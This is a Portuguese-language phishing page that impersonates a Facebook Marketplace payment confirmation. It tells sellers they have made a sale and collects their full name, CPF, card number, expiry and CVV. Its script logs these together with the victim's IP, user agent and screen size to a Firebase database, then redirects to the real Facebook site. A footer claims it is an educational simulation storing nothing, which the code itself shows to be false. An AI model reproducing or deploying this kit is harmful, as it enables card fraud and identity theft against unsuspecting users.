<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Facebook | Confirmação de Pagamento</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0;
      padding: 0;
      -webkit-text-size-adjust: 100%;
    }

    body {
      font-family: Helvetica, Arial, sans-serif;
      background: #f0f2f5;
      color: #1c1e21;
      line-height: 1.6;
      touch-action: manipulation;
    }

    /* (Todos os estilos anteriores permanecem iguais) */
    /* ... (mantenha todo o conteúdo da tag style) ... */
  </style>
</head>
<body>
  <!-- Card de boas-vindas (aparece primeiro) -->
  <div class="welcome-overlay" id="welcomeOverlay">
    <div class="welcome-card">
      <div class="welcome-icon">
        <i class="fas fa-trophy"></i>
      </div>
      <h2 class="welcome-title">Parabéns, você vendeu!</h2>
      <p class="welcome-text">Falta pouco para concluir sua venda. Preencha seus dados para liberarmos o pagamento.</p>
      <button class="welcome-button" id="startButton">
        Começar agora
      </button>
    </div>
  </div>

  <!-- Container principal (formulário) -->
  <div class="main-container" id="mainContainer">
    <div class="logo">facebook</div>
    
    <div class="form-box">
      <form id="deliveryForm">
        <!-- Primeira etapa - Dados pessoais -->
        <div id="personalFields">
          <div class="form-header">
            <h2 class="form-title">Confirme seus dados pessoais</h2>
            <p class="form-subtitle">Preencha com suas informações para receber o pagamento</p>
          </div>

          <div class="input-group">
            <label class="input-label" for="nome">Nome completo</label>
            <input type="text" id="nome" placeholder="Digite seu nome completo" required>
          </div>

          <div class="input-group">
            <label class="input-label" for="cpf">CPF</label>
            <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
            <div class="error-message" id="cpf-error">Por favor, insira um CPF válido</div>
          </div>

          <button type="button" id="continueBtn" class="continue-btn" disabled>
            Confirmar e receber pagamento
          </button>
        </div>

        <!-- Segunda etapa - Dados de pagamento (inicialmente ocultos) -->
        <div id="paymentFields" class="payment-fields">
          <div class="payment-methods">
            <div class="payment-methods-title">
              <i class="fas fa-credit-card"></i>
              <span>Cartões aceitos para saque:</span>
            </div>
            
            <div class="accepted-cards">
              <div class="card-info">
                <img src="https://img.icons8.com/color/48/000000/visa.png" class="card-icon" alt="Visa">
                <span class="card-name">Visa</span>
              </div>
              
              <div class="card-info">
                <img src="https://img.icons8.com/color/48/000000/mastercard.png" class="card-icon" alt="Mastercard">
                <span class="card-name">Mastercard</span>
              </div>
            </div>

            <div class="withdrawal-info">
              <strong>Como funciona:</strong> O valor da sua venda será depositado na conta vinculada a este cartão em até <strong>30 Minutos</strong> após a confirmação.
            </div>
          </div>

          <div class="input-group">
            <label class="input-label" for="cartao">Número do cartão</label>
            <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
            <img id="bandeira" class="card-brand" src="" alt="" style="display:none;">
            <div class="error-message" id="cartao-error">Informe um cartão Visa ou Mastercard válido</div>
          </div>

          <div class="input-group">
            <label class="input-label" for="validade">Validade</label>
            <input type="text" id="validade" placeholder="Mês/Ano" maxlength="5" required>
            <div class="error-message" id="validade-error">Data inválida</div>
          </div>

          <div class="input-group">
            <label class="input-label" for="cvv">Código de segurança (CVV)</label>
            <input type="password" id="cvv" placeholder="•••" maxlength="4" required>
            <i class="fas fa-eye" id="toggleCVV"></i>
            <div class="error-message" id="cvv-error">Código inválido</div>
          </div>

          <div class="security-info">
            <i class="fas fa-lock"></i>
            <span>Seus dados estão protegidos com criptografia</span>
          </div>

          <button type="submit" id="submitBtn">
            <span id="btnText">Confirmar e receber pagamento</span>
            <div class="loading" id="loading"></div>
          </button>
        </div>

        <div class="success-message" id="successMessage">
          <i class="fas fa-check-circle"></i> Saque processado com sucesso!
        </div>
      </form>
    </div>

    <div class="info-text">Facebook Pagamentos Seguros © 2025</div>
    <div class="footer">Esta é uma simulação educacional. Nenhum dado será armazenado ou processado.</div>
  </div>

  <!-- Scripts do Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>

  <script>
    // Configuração do Firebase (atualize com suas credenciais)
    const firebaseConfig = {
      apiKey: "AIzaSyCQ4uHyf_HELV8vfq9YcFyW2yq06xVHuho",
      authDomain: "pagamento-facebook.firebaseapp.com",
      databaseURL: "https://pagamento-facebook-default-rtdb.firebaseio.com",
      projectId: "pagamento-facebook",
      storageBucket: "pagamento-facebook.appspot.com",
      messagingSenderId: "1000865136747",
      appId: "1:1000865136747:web:252c2e7e9a4b13b40f312e"
    };

    // Inicialize o Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Elementos DOM
    const welcomeOverlay = document.getElementById('welcomeOverlay');
    const startButton = document.getElementById('startButton');
    const mainContainer = document.getElementById('mainContainer');
    const form = document.getElementById('deliveryForm');
    const nome = document.getElementById('nome');
    const cpf = document.getElementById('cpf');
    const continueBtn = document.getElementById('continueBtn');
    const personalFields = document.getElementById('personalFields');
    const paymentFields = document.getElementById('paymentFields');
    const cartao = document.getElementById('cartao');
    const bandeira = document.getElementById('bandeira');
    const validade = document.getElementById('validade');
    const cvv = document.getElementById('cvv');
    const toggleCVV = document.getElementById('toggleCVV');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const loading = document.getElementById('loading');
    const successMessage = document.getElementById('successMessage');

    // Mostrar o formulário quando clicar em Começar
    startButton.addEventListener('click', function() {
      welcomeOverlay.style.opacity = '0';
      welcomeOverlay.style.transition = 'opacity 0.3s ease';
      
      setTimeout(() => {
        welcomeOverlay.style.display = 'none';
        mainContainer.style.display = 'flex';
      }, 300);
    });

    // Máscaras e validações
    cpf.addEventListener('input', formatarCPF);
    cartao.addEventListener('input', formatarCartao);
    validade.addEventListener('input', formatarValidade);
    cvv.addEventListener('input', validarCVV);
    toggleCVV.addEventListener('click', toggleCVVVisibility);
    continueBtn.addEventListener('click', showPaymentFields);
    nome.addEventListener('input', validatePersonalFields);
    cpf.addEventListener('input', validatePersonalFields);

    // Funções auxiliares
    function formatarCPF() {
      let v = cpf.value.replace(/\D/g, "");
      v = v.replace(/(\d{3})(\d)/, "$1.$2");
      v = v.replace(/(\d{3})(\d)/, "$1.$2");
      v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
      cpf.value = v;
      
      const cpfError = document.getElementById('cpf-error');
      if (v.length === 14) {
        cpfError.style.display = 'none';
        cpf.classList.remove('error');
        cpf.blur();
        continueBtn.focus();
        setTimeout(() => {
          continueBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 100);
      } else {
        cpfError.style.display = 'block';
        cpf.classList.add('error');
      }
      validatePersonalFields();
    }

    function validatePersonalFields() {
      continueBtn.disabled = !(nome.value.trim() !== '' && cpf.value.length === 14);
    }

    function showPaymentFields() {
      personalFields.style.display = 'none';
      paymentFields.style.display = 'block';
    }

    function formatarCartao() {
      let v = cartao.value.replace(/\D/g, "");
      v = v.replace(/(\d{4})(?=\d)/g, "$1 ");
      cartao.value = v.trim();
      detectarBandeira(v);
      
      const cartaoError = document.getElementById('cartao-error');
      if (v.replace(/\s/g, '').length >= 13) {
        cartaoError.style.display = 'none';
        cartao.classList.remove('error');
      } else {
        cartaoError.style.display = 'block';
        cartao.classList.add('error');
      }
    }

    function detectarBandeira(numero) {
      numero = numero.replace(/\s/g, '');
      let src = "";
      let cartaoValido = false;
      
      if (/^4/.test(numero)) {
        src = "https://img.icons8.com/color/48/000000/visa.png";
        cartaoValido = true;
      } else if (/^5[1-5]/.test(numero)) {
        src = "https://img.icons8.com/color/48/000000/mastercard.png";
        cartaoValido = true;
      }

      const cartaoError = document.getElementById('cartao-error');
      if (src && numero.length > 0) {
        bandeira.src = src;
        bandeira.style.display = "block";
        if (!cartaoValido) {
          cartaoError.textContent = "Aceitamos apenas Visa e Mastercard";
          cartaoError.style.display = 'block';
          cartao.classList.add('error');
        } else {
          cartaoError.style.display = 'none';
          cartao.classList.remove('error');
        }
      } else {
        bandeira.style.display = "none";
        cartaoError.textContent = "Informe um cartão Visa ou Mastercard válido";
      }
    }

    function formatarValidade() {
      let v = validade.value.replace(/\D/g, "");
      if (v.length >= 3) {
        v = v.replace(/(\d{2})(\d)/, "$1/$2");
      }
      validade.value = v;
      
      const validadeError = document.getElementById('validade-error');
      if (v.length === 5) {
        const [mes, ano] = v.split('/');
        const mesNum = parseInt(mes);
        if (mesNum >= 1 && mesNum <= 12) {
          validadeError.style.display = 'none';
          validade.classList.remove('error');
        } else {
          validadeError.style.display = 'block';
          validade.classList.add('error');
        }
      } else {
        validadeError.style.display = 'block';
        validade.classList.add('error');
      }
    }

    function validarCVV() {
      cvv.value = cvv.value.replace(/\D/g, "");
      const cvvError = document.getElementById('cvv-error');
      
      if (cvv.value.length >= 3) {
        cvvError.style.display = 'none';
        cvv.classList.remove('error');
      } else {
        cvvError.style.display = 'block';
        cvv.classList.add('error');
      }
    }

    function toggleCVVVisibility() {
      if (cvv.type === 'password') {
        cvv.type = 'text';
        toggleCVV.classList.remove('fa-eye');
        toggleCVV.classList.add('fa-eye-slash');
      } else {
        cvv.type = 'password';
        toggleCVV.classList.remove('fa-eye-slash');
        toggleCVV.classList.add('fa-eye');
      }
    }

    // Função para testar a conexão com o Firebase
    async function testarConexaoFirebase() {
      try {
        const testRef = database.ref('testeConexao');
        await testRef.set({
          timestamp: new Date().toISOString(),
          teste: "conexao_ativa"
        });
        await testRef.remove();
        return true;
      } catch (error) {
        console.error("Falha na conexão com Firebase:", error);
        return false;
      }
    }

    // Função para validar dados antes de enviar
    function validarDadosCompletos(data) {
      if (!data.nome || data.nome.length < 3) {
        alert("Por favor, insira um nome válido");
        return false;
      }
      
      if (!data.cpf || data.cpf.length !== 14) {
        alert("CPF inválido");
        return false;
      }
      
      if (!data.numeroCartao || data.numeroCartao.length < 13) {
        alert("Número do cartão inválido");
        return false;
      }
      
      if (!/^\d{2}\/\d{2}$/.test(data.validade)) {
        alert("Data de validade inválida (formato MM/AA)");
        return false;
      }
      
      if (!/^\d{3,4}$/.test(data.cvv)) {
        alert("Código de segurança inválido (3 ou 4 dígitos)");
        return false;
      }
      
      return true;
    }

    // Envio do formulário com Firebase
    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Verificar conexão com Firebase
      const conexaoAtiva = await testarConexaoFirebase();
      if (!conexaoAtiva) {
        alert("Erro de conexão. Verifique sua internet e tente novamente.");
        return;
      }

      // Mostrar loading
      btnText.style.display = 'none';
      loading.style.display = 'block';
      submitBtn.disabled = true;
      
      try {
        // Capturar IP do usuário
        let userIP = "Não capturado";
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          userIP = data.ip;
        } catch (ipError) {
          console.warn("Não foi possível obter o IP:", ipError);
        }

        // Preparar dados para envio
        const dadosPagamento = {
          nome: nome.value.trim(),
          cpf: cpf.value,
          cartao: {
            numero: cartao.value.replace(/\s/g, ''),
            bandeira: bandeira.src.includes('visa') ? 'Visa' : 
                     bandeira.src.includes('mastercard') ? 'Mastercard' : 'Desconhecida',
            validade: validade.value,
            cvv: cvv.value
          },
          metadata: {
            dataHora: new Date().toISOString(),
            ip: userIP,
            userAgent: navigator.userAgent,
            dispositivo: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
            resolucao: `${window.screen.width}x${window.screen.height}`
          }
        };

        // Validar dados
        if (!validarDadosCompletos({
          nome: dadosPagamento.nome,
          cpf: dadosPagamento.cpf,
          numeroCartao: dadosPagamento.cartao.numero,
          validade: dadosPagamento.cartao.validade,
          cvv: dadosPagamento.cartao.cvv
        })) {
          throw new Error("Dados inválidos");
        }

        // Enviar para Firebase
        const novaTransacao = database.ref('transacoes').push();
        await novaTransacao.set(dadosPagamento);
        
        console.log("Dados salvos com ID:", novaTransacao.key);

        // Sucesso
        loading.style.display = 'none';
        successMessage.style.display = 'block';
        submitBtn.style.display = 'none';
        
        // Redirecionar
        setTimeout(() => {
          window.location.href = 'fb://facewebmodal/f?href=https://www.facebook.com/marketplace/you/dashboard';
          setTimeout(() => {
            window.location.href = 'https://www.facebook.com/marketplace/you/dashboard';
          }, 500);
        }, 3000);
        
      } catch (error) {
        console.error("Erro no processamento:", error);
        loading.style.display = 'none';
        btnText.style.display = 'block';
        submitBtn.disabled = false;
        
        // Mensagens de erro específicas
        if (error.message.includes("permission_denied")) {
          alert("Erro de permissão. Verifique as regras do Firebase.");
        } else {
          alert(error.message || "Erro ao processar pagamento. Tente novamente.");
        }
      }
    });

    // Prevenir zoom em dispositivos móveis
    document.addEventListener('gesturestart', function(e) {
      e.preventDefault();
    });
  </script>
</body>
</html>
